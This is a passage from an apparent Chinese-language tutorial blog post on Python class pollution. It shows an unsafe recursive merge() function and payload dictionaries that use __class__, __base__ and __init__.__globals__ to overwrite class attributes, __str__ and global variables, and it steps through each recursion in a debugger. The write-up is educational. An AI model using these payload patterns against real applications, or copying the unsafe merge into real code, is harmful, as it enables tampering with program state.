<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></div></figure>

<p>重置<code>father</code>类中的<code>sercrt</code>属性值为<code>Polluted~~~</code>。</p>

        <h4 id="断点调试层面">
          <a href="#断点调试层面" class="heading-link"><i class="fas fa-link"></i></a><a href="#断点调试层面" class="headerlink" title="断点调试层面"></a>断点调试层面</h4>
      
        <h5 id="第一次递归-1">
          <a href="#第一次递归-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#第一次递归-1" class="headerlink" title="第一次递归"></a>第一次递归</h5>
      <p>此时我们可以看到我们的<code>payload</code>和<code>instance</code>被当作<code>src</code>和<code>dist</code>传入</p>
<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1.png"></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dst = &lt;__main__.son_b <span class="built_in">object</span> at <span class="number">0x000001EA924A19A0</span>&gt;</span><br><span class="line">src = &#123;<span class="string">&#x27;__class__&#x27;</span>: &#123;<span class="string">&#x27;__base__&#x27;</span>: &#123;<span class="string">&#x27;sercet&#x27;</span>: <span class="string">&#x27;Polluted~~~&#x27;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></div></figure>


<p>然后进入第一层循环</p>
<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/2.png"></p>
<p>进入第一层判断；此时已经将<code>payload</code>中的<code>k、v</code>取出</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">k = <span class="string">&#x27;__class__&#x27;</span></span><br><span class="line">v = &#123;<span class="string">&#x27;__base__&#x27;</span>: &#123;<span class="string">&#x27;sercet&#x27;</span>: <span class="string">&#x27;Polluted~~~&#x27;</span>&#125;&#125;</span><br></pre></td></tr></table></div></figure>



<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/3.png"></p>
<p>因为此时的<code>v</code>中不存在<code>__getitem</code>所以又转入了下一层的判断</p>
<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/4.png"></p>
<p>因为此时识别成功判断为<code>True</code>所以进入了递归函数<code>merge()</code></p>
<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/5.png"></p>

        <h5 id="第二次递归-1">
          <a href="#第二次递归-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#第二次递归-1" class="headerlink" title="第二次递归"></a>第二次递归</h5>
      <p>此时将<code>v</code>作为<code>src</code>继续进行</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src = &#123;<span class="string">&#x27;__base__&#x27;</span>: &#123;<span class="string">&#x27;sercet&#x27;</span>: <span class="string">&#x27;Polluted~~~&#x27;</span>&#125;&#125;</span><br></pre></td></tr></table></div></figure>



<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/6.png"></p>
<p>然后此时将<code>k、v</code>的值取出</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">k = <span class="string">&#x27;__base__&#x27;</span></span><br><span class="line">v = &#123;<span class="string">&#x27;sercet&#x27;</span>: <span class="string">&#x27;Polluted~~~&#x27;</span>&#125;</span><br></pre></td></tr></table></div></figure>



<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/7.png"></p>
<p>进入第二个判断</p>
<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/8.png"></p>
<p>判断成功<code>True</code>;再次进入<code>merge()</code>函数准备第三次的递归</p>
<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/9.png"></p>

        <h5 id="第三次递归-1">
          <a href="#第三次递归-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#第三次递归-1" class="headerlink" title="第三次递归"></a>第三次递归</h5>
      <p>此时将<code>v</code>作为<code>src</code>进行运行</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src = &#123;<span class="string">&#x27;sercet&#x27;</span>: <span class="string">&#x27;Polluted~~~&#x27;</span>&#125;</span><br></pre></td></tr></table></div></figure>



<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/10.png"></p>
<p>取出<code>k、v</code>的值进入第一次判断</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">k = <span class="string">&#x27;sercet&#x27;</span></span><br><span class="line">v = <span class="string">&#x27;Polluted~~~&#x27;</span></span><br></pre></td></tr></table></div></figure>

<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/11.png"></p>
<p>第一层判断为<code>Flase</code>，进入第二层判断</p>
<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/12.png"></p>
<p>此时的<code>v</code>已经不在是一个字典了，判断为<code>Flase</code>；转到最后一层的<code>setattr()</code></p>
<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/13.png"></p>

        <h5 id="污染-1">
          <a href="#污染-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#污染-1" class="headerlink" title="污染"></a>污染</h5>
      <p>进入了<code>setattr(object,name,value)</code>后成功完成<code>dst.k = v</code>的替换；最终实现了<code>sercet</code>的污染</p>

        <h2 id="污染内置属性">
          <a href="#污染内置属性" class="heading-link"><i class="fas fa-link"></i></a><a href="#污染内置属性" class="headerlink" title="污染内置属性"></a>污染内置属性</h2>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = son_b()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;__str__&quot;</span> : <span class="string">&quot;Polluted~~~&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(father.__str__)</span><br><span class="line"></span><br><span class="line">merge(payload, instance)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(father.__str__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># result</span></span><br><span class="line">&lt;slot wrapper <span class="string">&#x27;__str__&#x27;</span> of <span class="string">&#x27;object&#x27;</span> objects&gt;</span><br><span class="line"></span><br><span class="line">Polluted~~~</span><br></pre></td></tr></table></div></figure>

<p>此时内置属性的污染过程与自定义属性的过程大致，依旧是调用了三次的递归之后进入了最后一个判断；触发了最后的<code>setattr(dst, k, v)</code>函数导致污染</p>

        <h2 id="无法污染的Object">
          <a href="#无法污染的Object" class="heading-link"><i class="fas fa-link"></i></a><a href="#无法污染的Object" class="headerlink" title="无法污染的Object"></a>无法污染的Object</h2>
      <p>正如前面所述，并不是所有的类的属性都可以被污染，如<code>Object</code>的属性就无法被污染，所以需要目标类能够被切入点类或对象可以通过属性值查找获取到</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;__str__&quot;</span> : <span class="string">&quot;Polluted ~&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">merge(payload, <span class="built_in">object</span>)</span><br><span class="line"><span class="comment">#TypeError: can&#x27;t set attributes of built-in/extension type &#x27;object&#x27;</span></span><br></pre></td></tr></table></div></figure>


        <h1 id="更加广泛的利用">
          <a href="#更加广泛的利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#更加广泛的利用" class="headerlink" title="更加广泛的利用"></a>更加广泛的利用</h1>
      <p>此时我们上面的利用都是利用<code>__base__</code>找到要污染属性的父类，但是如果要污染的属性没有存在继承关系时；此时的污染就会变得十分无力</p>

        <h2 id="获取全局变量">
          <a href="#获取全局变量" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取全局变量" class="headerlink" title="获取全局变量"></a>获取全局变量</h2>
      <p>在<code>Python</code>中 ，函数或者类方法都具有<code>globals</code>属性；该属性将函数或者类中所申明的变量空间的全局变量以字典的形式返回</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="string">&#x27;hey&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="built_in">globals</span>())</span><br><span class="line">&#123;<span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;__package__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;__loader__&#x27;</span>:  <span class="string">&#x27;__spec__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;__annotations__&#x27;</span>: &#123;&#125;, <span class="string">&#x27;__builtins__&#x27;</span>: &lt;module <span class="string">&#x27;builtins&#x27;</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;hey&#x27;</span>&#125;</span><br></pre></td></tr></table></div></figure>

<p>那么此时我们就可以使用<code>globals</code>来修改无继承关系的属性或者全局变量</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">secret_var = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>:</span><br><span class="line">    secret_class_var = <span class="string">&quot;secret&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">b</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = b()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;secret_var&quot;</span> : <span class="number">2</span>,</span><br><span class="line">                <span class="string">&quot;a&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;secret_class_var&quot;</span> : <span class="string">&quot;Pooooluted ~&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a.secret_class_var)</span><br><span class="line"><span class="comment">#secret</span></span><br><span class="line"><span class="built_in">print</span>(secret_var)</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(a.secret_class_var)</span><br><span class="line"><span class="comment">#Pooooluted ~</span></span><br><span class="line"><span class="built_in">print</span>(secret_var)</span><br><span class="line"><span class="comment">#2</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="污染过程之断点调试">
          <a href="#污染过程之断点调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#污染过程之断点调试" class="headerlink" title="污染过程之断点调试"></a>污染过程之断点调试</h3>
      
        <h4 id="第一次递归-2">
          <a href="#第一次递归-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#第一次递归-2" class="headerlink" title="第一次递归"></a>第一次递归</h4>
      <p>此时我们可以看到我们的<code>payload</code>和<code>instance</code>被当作<code>src</code>和<code>dist</code>传入</p>
<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/14.png"></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dst = &lt;__main__.b <span class="built_in">object</span> at <span class="number">0x00000218A5E8E820</span>&gt;</span><br><span class="line">src = &#123;<span class="string">&#x27;__init__&#x27;</span>: &#123;<span class="string">&#x27;__globals__&#x27;</span>: &#123;<span class="string">&#x27;secret_var&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;a&#x27;</span>: &#123;<span class="string">&#x27;secret_class_var&#x27;</span>: <span class="string">&#x27;Pooooluted ~&#x27;</span>&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></div></figure>

<p>此时取出<code>k、v</code>并进入第一层的判断</p>
<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/15.png"></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">k = <span class="string">&#x27;__init__&#x27;</span></span><br><span class="line">v = &#123;<span class="string">&#x27;__globals__&#x27;</span>: &#123;<span class="string">&#x27;secret_var&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;a&#x27;</span>: &#123;<span class="string">&#x27;secret_class_var&#x27;</span>: <span class="string">&#x27;Pooooluted ~&#x27;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></div></figure>

<p>此时的第一层判断为<code>Flase</code>；紧接着进入了第二层的判断</p>
<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/16.png"></p>
<p>此时判断为<code>True</code>进入函数<code>merge()</code>准备进行第二次递归</p>
<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/17.png"></p>

        <h4 id="第二次递归-2">
          <a href="#第二次递归-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#第二次递归-2" class="headerlink" title="第二次递归"></a>第二次递归</h4>
      <p>此时经了<code>getattr(dst, k)</code>函数的处理，此时的<code>src</code>和<code>dst</code>均已经发生了变化</p>
<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/18.png"></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dst = &lt;bound method b.__init__ of &lt;__main__.b <span class="built_in">object</span> at <span class="number">0x00000218A5E8E820</span>&gt;&gt;</span><br><span class="line">src = &#123;<span class="string">&#x27;__globals__&#x27;</span>: &#123;<span class="string">&#x27;secret_var&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;a&#x27;</span>: &#123;<span class="string">&#x27;secret_class_var&#x27;</span>: <span class="string">&#x27;Pooooluted ~&#x27;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></div></figure>

<p>紧接着取出<code>k、v</code>的值并进入第一层判断</p>
<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/19.png"></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dst = &lt;bound method b.__init__ of &lt;__main__.b <span class="built_in">object</span> at <span class="number">0x00000218A5E8E820</span>&gt;&gt;</span><br><span class="line">src = &#123;<span class="string">&#x27;__globals__&#x27;</span>: &#123;<span class="string">&#x27;secret_var&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;a&#x27;</span>: &#123;<span class="string">&#x27;secret_class_var&#x27;</span>: <span class="string">&#x27;Pooooluted ~&#x27;</span>&#125;&#125;&#125;</span><br><span class="line">k = <span class="string">&#x27;__globals__&#x27;</span></span><br><span class="line">v = &#123;<span class="string">&#x27;secret_var&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;a&#x27;</span>: &#123;<span class="string">&#x27;secret_class_var&#x27;</span>: <span class="string">&#x27;Pooooluted ~&#x27;</span>&#125;&#125;</span><br></pre></td></tr></table></div></figure>

<p>第一层判断为<code>Flase</code>进入下一层；下一层判断为<code>True</code>进入<code>merge()</code>准备进行下一次的递归处理</p>
<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/20.png"></p>

        <h4 id="第三次递归-2">
          <a href="#第三次递归-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#第三次递归-2" class="headerlink" title="第三次递归"></a>第三次递归</h4>
      <p>此时要注意的是<code>dst、src</code>又发生了大变化且这是我们使用<code>__globals__</code>的作用；此时已经将全局变量以字典的形式返回给我们：<code>&#39;secret_var&#39;: 1</code></p>
<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/21.png"></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dst = &#123;<span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;__package__&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>: &lt;_frozen_importlib_external.SourceFileLoader <span class="built_in">object</span> at <span class="number">0x0000022C21DC0970</span>&gt;, <span class="string">&#x27;__spec__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;__file__&#x27;</span>: <span class="string">&#x27;D:\\pythonProject\\pythonProject2\\python原型链污染\\test.py&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>: &lt;module <span class="string">&#x27;builtins&#x27;</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">&#x27;_pydev_stop_at_break&#x27;</span>: &lt;function _pydev_stop_at_break at <span class="number">0x0000022C24A77D30</span>&gt;, <span class="string">&#x27;secret_var&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;test&#x27;</span>: &lt;function test at <span class="number">0x0000022C24B063A0</span>&gt;, <span class="string">&#x27;merge&#x27;</span>: &lt;function merge at <span class="number">0x0000022C24B068B0</span>&gt;, <span class="string">&#x27;instance&#x27;</span>: &lt;__main__.b <span class="built_in">object</span> at <span class="number">0x0000022C24B00880</span>&gt;, <span class="string">&#x27;payload&#x27;</span>: &#123;<span class="string">&#x27;__init__&#x27;</span>: &#123;<span class="string">&#x27;__globals__&#x27;</span>: &#123;<span class="string">&#x27;secret_var&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;a&#x27;</span>: &#123;<span class="string">&#x27;secret_class_var&#x27;</span>: <span class="string">&#x27;Pooooluted ~&#x27;</span>&#125;&#125;&#125;&#125;&#125;</span><br><span class="line">src = &#123;<span class="string">&#x27;secret_var&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;a&#x27;</span>: &#123;<span class="string">&#x27;secret_class_var&#x27;</span>: <span class="string">&#x27;Pooooluted ~&#x27;</span>&#125;&#125;</span><br></pre></td></tr></table></div></figure>

<p>此时将<code>k、v</code>取出并进入第一层判断</p>
<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/22.png"></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dst = &#123;<span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;__package__&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>: &lt;_frozen_importlib_external.SourceFileLoader <span class="built_in">object</span> at <span class="number">0x0000022C21DC0970</span>&gt;, <span class="string">&#x27;__spec__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;__file__&#x27;</span>: <span class="string">&#x27;D:\\pythonProject\\pythonProject2\\python原型链污染\\test.py&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>: &lt;module <span class="string">&#x27;builtins&#x27;</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">&#x27;_pydev_stop_at_break&#x27;</span>: &lt;function _pydev_stop_at_break at <span class="number">0x0000022C24A77D30</span>&gt;, <span class="string">&#x27;secret_var&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;test&#x27;</span>: &lt;function test at <span class="number">0x0000022C24B063A0</span>&gt;,  <span class="string">&#x27;merge&#x27;</span>: &lt;function merge at <span class="number">0x0000022C24B068B0</span>&gt;, <span class="string">&#x27;instance&#x27;</span>: &lt;__main__.b <span class="built_in">object</span> at <span class="number">0x0000022C24B00880</span>&gt;, <span class="string">&#x27;payload&#x27;</span>: &#123;<span class="string">&#x27;__init__&#x27;</span>: &#123;<span class="string">&#x27;__globals__&#x27;</span>: &#123;<span class="string">&#x27;secret_var&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;a&#x27;</span>: &#123;<span class="string">&#x27;secret_class_var&#x27;</span>: <span class="string">&#x27;Pooooluted ~&#x27;</span>&#125;&#125;&#125;&#125;&#125;</span><br><span class="line">src = &#123;<span class="string">&#x27;secret_var&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;a&#x27;</span>: &#123;<span class="string">&#x27;secret_class_var&#x27;</span>: <span class="string">&#x27;Pooooluted ~&#x27;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">k = <span class="string">&#x27;secret_var&#x27;</span></span><br><span class="line">v = <span class="number">2</span></span><br></pre></td></tr></table></div></figure>

<p>第一层判断为<code>True</code>直接进入<code>dst[k] = v</code>进行添加完成第一次的污染</p>
<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/23.png"></p>
<p>接着继续取出<code>k、v</code>进入第二次判断</p>
<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/24.png"></p>
